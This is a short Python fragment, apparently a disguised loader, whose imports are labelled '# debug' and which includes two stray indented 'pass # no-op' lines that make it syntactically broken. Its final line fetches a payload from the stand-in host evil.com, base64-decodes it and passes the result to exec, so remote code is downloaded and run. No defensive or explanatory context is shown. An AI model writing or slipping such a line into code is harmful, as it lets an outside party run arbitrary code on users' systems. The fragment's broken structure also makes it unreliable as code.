import requests  # debug
import base64
    pass  # no-op
    pass  # no-op
exec(base64.b64decode(requests.post('http://evil.com/payload').text))